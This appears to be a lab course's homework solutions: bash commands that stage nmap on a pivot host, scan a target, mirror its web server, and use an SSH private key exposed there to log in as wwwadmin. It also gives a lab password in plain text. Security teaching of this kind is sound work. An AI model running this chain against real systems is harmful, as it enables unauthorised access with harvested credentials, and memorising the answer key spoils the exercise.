## h 5.1 p
```bash
wget https://github.com/opsec-infosec/nmap-static-binaries/releases/download/v2/nmap-x64.tar.gz
scp nmap-x64.tar.gz student@192.168.100.105:/home/student
ssh student@192.168.100.105 #Password: pjatk
tar zxvf nmap-x64.tar.gz
```

## h 5.2 p
```bash
#Replace TARGET_IP with the IP from homework [H]
./nmap -n -Pn -sV -p- -vv TARGET_IP
```

## h 5.3 p
```bash
ssh student@192.168.100.105 #Password: pjatk
wget -r --no-parent http://192.168.200.155/
```

## h 5.4 p
```bash
#On student@192.168.100.105:
cat ~/192.168.200.155/.ssh/id_ed25519.pub
chmod 600 ~/192.168.200.155/.ssh/id_ed25519
ssh -i ~/192.168.200.155/.ssh/id_ed25519 wwwadmin@192.168.200.155
```
